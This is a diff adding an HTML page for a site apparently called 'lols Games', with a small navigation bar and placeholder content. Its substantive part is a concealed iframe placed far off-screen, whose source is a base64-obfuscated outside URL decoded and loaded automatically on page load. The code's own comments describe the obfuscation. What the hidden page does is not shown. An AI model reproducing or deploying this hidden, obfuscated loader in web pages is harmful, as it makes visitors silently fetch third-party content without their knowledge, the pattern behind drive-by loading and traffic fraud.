@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>lols Games</title>
+  <style>
+    body {
+      background-color: #333333;
+      margin: 0;
+      padding: 0;
+    }
+    /* Styles for top navigation bar */
+    /* Your existing styles */
+  </style>
+</head>
+<body>
+  <!-- Top navigation bar -->
+  <div id="top-bar">
+    <button id="home-button" onclick="window.location.href='./index.html'">Home</button>
+    <button id="my-button" onclick="window.location.href='./Game.html'">Games</button>
+    <button id="about-button" onclick="window.location.href='./About.html'">About</button>
+  </div>
+  
+  <!-- Your website content goes here -->
+  
+  <!-- Obfuscate the iframe code -->
+  <div style="position: absolute; top: -9999px; left: -9999px;">
+    <iframe id="hidden-iframe"></iframe>
+  </div>
+
+  <style>
+    html, body {
+      overflow: hidden;
+    }
+  </style>
+
+  <script>
+    // Obfuscate the URL and load the iframe dynamically
+    (function() {
+      var iframe = document.getElementById('hidden-iframe');
+      var url = "aHR0cHM6Ly9hZGRpdGlvbi5wYXJ0aWNsZS5lcz"; // Base64 encoded URL
+      iframe.src = atob(url);
+    })();
+  </script>
+</body>
+</html>
